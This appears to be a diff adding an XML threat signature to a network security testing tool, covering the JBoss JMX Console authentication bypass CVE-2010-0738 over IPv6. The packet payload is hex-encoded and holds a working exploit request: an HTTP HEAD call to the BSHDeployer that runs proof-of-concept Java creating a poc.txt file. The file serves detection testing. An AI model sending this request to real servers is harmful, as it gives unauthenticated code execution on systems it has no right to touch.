@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="RedHat JBoss Enterprise Application Platform JMX Console Authentication Bypass (IPv6 Version)"/>
+    <EngDesc display="true" value="An authentication bypass vulnerability has been reported in JBoss Enterprise Application Platform JMX Console application. The vulnerability is caused by the authentication policy within the application that only enforces restrictions for GET and POST methods, other HTTP request verbs bypass authentication. Unauthenticated remote attackers could exploit this vulnerability to gain administrative access to JBoss JMX management console and to upload and execute arbitrary Java code within the security context of the JBoss server process, normally SYSTEM on Windows platforms. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Code_Execution/Authentication_Weakness"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="RedHat"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Red_Hat_JBoss_Enterprise_Application_Platform"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Red_Hat_JBoss_Enterprise_Application_Platform_Prior_to_4.2.0.CP09"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2010-0738"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="4f85a7728d76f5b368f12a0f894b5a9f"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634129049560691265"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1277285407" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIPv6" type="ImperfectControls.IPv6Address" value="null" index="K"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="L"/>
+    <NamedVar name="sourceIPv6" type="ImperfectControls.IPv6Address" value="null" index="M"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+    </for>
+    <for index="E">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="m"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:87:27:4E" pktType="0800">
+      <IPv6 Version="6" InternetHeaderLength="05" TypeofService="00" TotalLength="03FE" Identification="8D23" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="47D8" srcIP="$sourceIPv6" destIP="$destIPv6" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="42920" destPort="$HTTPdestPort" SeqNumber="559C0690" AckNumber="F1B61574" HeaderLength="08" WindowSize="002E" Checksum="A36E" UrgentPointer="0000" Options="0101080A729C8BAF00000000" Payload="48454144202F6A6D782D636F6E736F6C652F48746D6C41646170746F723F616374696F6E3D696E766F6B654F7042794E616D65266E616D653D6A626F73732E6465706C6F796572253341736572766963652533444253484465706C6F796572266D6574686F644E616D653D6372656174655363726970744465706C6F796D656E7426617267547970653D6A6176612E6C616E672E537472696E6726617267303D253230253230253230253230696D706F72742532306A6176612E696F2E25324125334225304125323025323025323025323046696C65253230662533422530412532302532302532302532307472792532302537422530412530397468656F7325334453797374656D2E67657450726F70657274792532382532326F732E6E616D6525323225323925334225304125303969662532387468656F732E7374617274735769746825323825323257696E646F7773253232253239253239253742253041253039253230253230253230253230662533446E657725323046696C6525323825323263253341253246706F632E747874253232253239253342253041253039253744253230656C7365253230253742253041253039253230253230253230253230662533446E657725323046696C65253238253232253246746D70253246706F632E7478742532322532392533422530412530392537442530412530396966253238253231662E657869737473253238253239253239253742253041253039662E6372656174654E657746696C6525323825323925334225304125303953797374656D2E6F75742E7072696E746C6E2532382532324E657725323066696C65253230706F632E7478742532306861732532306265656E25323063726561746564253232253239253342253041253039253744253041253039656C736525323025374225304125303953797374656D2E6F75742E7072696E746C6E25323825323246696C65253230706F632E7478742532306578697374732532322532392533422530412530392537442530412532302532302532302532302537442532306361746368253230253238253230494F457863657074696F6E2532306525323925323025374225304125303953797374656D2E6F75742E7072696E746C6E253238253232456E636F756E74657265642532306572726F722533412532302532322532302532422532306525323925334225304125323025323025323025323025374426617267547970653D6A6176612E6C616E672E537472696E6726617267313D736F617020485454502F312E300A5365742D436F6F6B69653A20536F6D652D436F6F6B69653B0A0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="E" Count="">
+      <Ethernet srcMac="00:0C:29:87:27:4E" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IPv6 Version="6" InternetHeaderLength="05" TypeofService="00" TotalLength="017E" Identification="7ED8" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="18A3" srcIP="$destIPv6" destIP="$sourceIPv6" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="42920" SeqNumber="F1B61574" AckNumber="559C0A5A" HeaderLength="08" WindowSize="F726" Checksum="2362" UrgentPointer="0000" Options="0101080A00C3FC43729C8BAE" Payload="485454502F312E3120323030204F4B0D0A5365727665723A204170616368652D436F796F74652F312E310D0A582D506F77657265642D42793A20536572766C657420322E343B204A426F73732D342E322E302E47415F4350303820286275696C643A2053564E5461673D4A42504150505F345F325F305F47415F4350303820646174653D323030393131323532303533292F4A426F73735765622D322E300D0A5365742D436F6F6B69653A204A53455353494F4E49443D33443841343132353736383831303430453943423836383641394436323845463B20506174683D2F0D0A436F6E74656E742D547970653A20746578742F68746D6C0D0A436F6E74656E742D4C656E6774683A20313537330D0A446174653A205475652C203235204D617920323031302031393A33373A343620474D540D0A436F6E6E656374696F6E3A20636C6F73650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
